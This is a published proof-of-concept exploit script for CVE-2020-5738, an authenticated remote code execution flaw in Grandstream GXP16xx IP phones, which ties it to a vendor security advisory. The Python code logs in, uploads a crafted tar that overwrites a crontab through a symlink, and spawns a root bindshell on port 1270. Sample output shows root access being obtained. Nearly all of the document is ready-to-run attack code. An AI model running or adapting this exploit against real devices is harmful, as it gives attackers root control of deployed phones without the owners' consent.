# Exploit Title: Grandstream GXP16xx Authenticated RCE via Tar Upload
# Date: 04/13/2020
# Exploit Author: Jacob Baines
# Vendor Homepage: http://www.grandstream.com/
# Software Link: http://www.grandstream.com/support/firmware
# Version: 1.0.4.152 and below
# Tested on: Grandstream GXP1625 1.0.4.152
# CVE : CVE-2020-5738
# Advisory: https://www.tenable.com/security/research/tra-2020-22
# 
# About this:
# This script uploads vpnscript.tar to the phone. The phone will untar the
# package which allows us to overwrite a crontab (via a symlink in the tar file).
# The cron starts a bindshell on port 1270. You might need to wait a minute until
# the crontab gets processed.
#
# Sample output:
# 
# albinolobster@ubuntu:~/poc/grandstream/gxp1600$ telnet 192.168.2.104 1270
# Trying 192.168.2.104...
# telnet: Unable to connect to remote host: Connection refused
# albinolobster@ubuntu:~/poc/grandstream/gxp1600$ python3 upload_rce.py -i 192.168.2.104 -p 80 --pass labpass1
# [+] Logging in via http://192.168.2.104:80/cgi-bin/dologin
# [+] Logged in. sid: 197489727e1586805795
# [+] Uploading the tar
# [+] Success!
# albinolobster@ubuntu:~/poc/grandstream/gxp1600$ telnet 192.168.2.104 1270
# Trying 192.168.2.104...
# telnet: Unable to connect to remote host: Connection refused
# albinolobster@ubuntu:~/poc/grandstream/gxp1600$ telnet 192.168.2.104 1270
# Trying 192.168.2.104...
# Connected to 192.168.2.104.
# Escape character is '^]'.
# uname -a
# Linux gxp1625_000b82af91ab 3.4.20-rt31-dvf-v1.3.1.2-rc1 #5 PREEMPT Fri Oct 11 11:56:43 PDT 2019 armv5tejl GNU/Linux
# whoami
# root
# 
import requests
import argparse
import sys
import re
import json

top_parser = argparse.ArgumentParser(description='lol')
top_parser.add_argument('-i', '--ip', action="store", dest="ip", required=True, help="The IPv4 address to connect to")
top_parser.add_argument('-p', '--port', action="store", dest="port", type=int, help="The port to connect to", default="80")
top_parser.add_argument('-u', '--username', action="store", dest="username", help="The user to login as", default="admin")
top_parser.add_argument('--pass', action="store", dest="password", required=True, help="The password to use")
args = top_parser.parse_args()

url = 'http://' + args.ip + ':' + str(args.port) + '/cgi-bin/dologin'
print('[+] Logging in via', url)
headers = {'Origin' : 'http://' + args.ip + ':' + str(args.port), 'Referer' : 'http://' + args.ip  + str(args.port)}
r = requests.post(url, headers=headers, data={'username': args.username,'password': args.password})
sid_regex = re.search("\"sid\": \"([0-9a-f]+)\"", r.text)
if sid_regex == None:
    print('[-] Failed to extract the sid.')
    sys.exit(0)

sid = sid_regex.group(1)
print('[+] Logged in. sid:', sid)
url = 'http://' + args.ip + ':' + str(args.port) + '/cgi-bin/upload_vpntar'
print('[+] Uploading the tar')
files = dict(file=('vpnscript', open('vpnscript.tar', 'rb')), fname=(None, 'C:\\fakepath\\test'), sid=(None,sid))
r = requests.post(url, files=files)

result = json.loads(r.text)
if result["body"] == "0":
    print('[+] Success!')
else:
    print('[-] Failure!', r.text)


